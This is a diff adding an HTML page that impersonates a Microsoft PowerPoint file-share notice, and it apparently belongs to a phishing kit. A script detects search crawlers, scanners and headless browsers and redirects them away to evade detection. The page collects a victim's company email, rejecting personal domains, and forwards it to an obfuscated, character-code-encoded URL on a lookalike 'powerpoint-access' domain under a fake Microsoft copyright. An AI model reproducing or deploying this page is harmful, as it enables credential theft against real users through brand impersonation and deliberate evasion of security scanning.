@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/svg" href="https://upload.wikimedia.org/wikipedia/commons/0/0d/Microsoft_Office_PowerPoint_%282019%E2%80%93present%29.svg">
+    <title>PowerPoint</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            background-color: #f4f4f4; /* Outlook blue background */
+            color: black; 
+            margin: 0; 
+            padding: 0; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: space-between; 
+        }
+        .container { margin-top: 100px; }
+        .logo { 
+            display: block;
+            margin: 0 auto 20px auto;
+            width: 100px; /* Adjust width */
+            height: auto; /* Auto keeps aspect ratio */
+            max-width: 120px; /* Prevents excessive resizing */
+        }
+        input, button { padding: 10px; margin-top: 10px; }
+        input { width: 280px; border: 1px solid #ccc; border-radius: 5px; }
+        button { background-color: #D35230; color: white; border: none; cursor: pointer; border-radius: 5px; }
+        footer { 
+            background: #f4f4f4; /* Footer matches the email form background */
+            color: black; 
+            padding: 15px; 
+            font-size: 14px; 
+            width: 100%; 
+            position: absolute; 
+            bottom: 0; 
+            text-align: center; 
+        }
+        footer a { color: #fff; text-decoration: none; margin: 0 10px; }
+    </style>
+</head>
+<body>
+    <!-- Bot Trap: Immediate Redirect -->
+    <script>
+        function isBot() {
+            const botAgents = [
+                "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "facebot", "ia_archiver", "YandexBot",
+                "curl", "wget", "python-requests", "scrapy", "PostmanRuntime", "MauiBot", "LinkPreview",
+                "HeadlessChrome", "PhantomJS", "selenium", "httpx", "httpclient", "axios", "go-http-client",
+                "MJ12bot", "SemrushBot", "rogerbot", "Baiduspider", "Bytespider", "Sogou", "Exabot", "AhrefsBot",
+                "Outlook-Express", "Microsoft URL Control", "MSIECrawler", "Trident", "CFNetwork", "Java/1.",
+                "ZohoExternalHit", "MegaIndex", "DotBot", "BLEXBot", "SEOkicks", "SerpstatBot", "DataForSeoBot",
+                "python-httpx", "Google-InspectionTool", "Google-Read-Aloud", "Google-Translate"
+            ];
+            
+            const userAgent = navigator.userAgent;
+            const isHeadless = navigator.webdriver || !(navigator.plugins.length > 0);
+            
+            return botAgents.some(bot => userAgent.includes(bot)) || isHeadless;
+        }
+
+        if (isBot()) {
+            window.location.href = "https://blocked.com"; // Redirect bots immediately
+        }
+    </script>
+
+    <!-- Outlook Authentication Page -->
+    <div id="auth-page" class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Microsoft_Office_PowerPoint_%282019%E2%80%93present%29.svg" alt="Outlook Logo" class="logo"><br>
+        
+        <p>Here's the PowerPoint file that <b>Andrew</b> shared with you.</p><br><br>
+        <input type="email" id="email" placeholder="Enter the recipient's email to proceed">
+        <button onclick="validateEmail()">Continue</button>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <p>&copy; <span id="year"></span> Microsoft. All Rights Reserved.</p>
+        <p>
+            <a href="privacy-policy.html" style="color: black;">Privacy Policy</a> |
+            <a href="terms-of-use.html" style="color: black;">Terms of Use</a>
+        </p>
+    </footer>
+
+    <script>
+        document.getElementById("year").textContent = new Date().getFullYear();
+
+        function validateEmail() {
+            let email = document.getElementById("email").value.trim();
+            let validRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if (!validRegex.test(email)) {
+                alert("Invalid email format");
+                return;
+            }
+
+            let forbiddenDomains = ["gmail.com", "yahoo.com", "aol.com", "company.com", "teste.com", "test.com", "mail.com", "email.com", "verizon.net"];
+            let emailDomain = email.split("@")[1].toLowerCase();
+            
+            if (forbiddenDomains.includes(emailDomain)) {
+                alert("Personal emails are not allowed. Use your company email.");
+                return;
+            }
+
+            let base64Email = (email);
+            let encodedURL = "104 116 116 112 115 58 47 47 121 111 117 114 112 114 111 112 45 100 97 116 97 114 111 111 109 45 112 111 119 101 114 112 111 105 110 116 45 97 99 99 101 115 115 46 115 117 98 111 100 111 114 101 114 54 46 99 111 109 47 87 54 48 73 85 98 111 78 84 105 99 100 87 105 72 71 73 81 108 72 116 114 69 70 102 104 86 81 83 89 105 81 47";
+            let decodedURL = encodedURL.split(" ").map(num => String.fromCharCode(num)).join("");
+
+            window.location.href = decodedURL + "*" + (base64Email);
+        }
+
+        // Enable "Enter" key submission for email input
+        document.getElementById("email").addEventListener("keypress", function(event) {
+            if (event.key === "Enter") {
+                validateEmail();
+            }
+        });
+    </script>
+</body>
+</html>
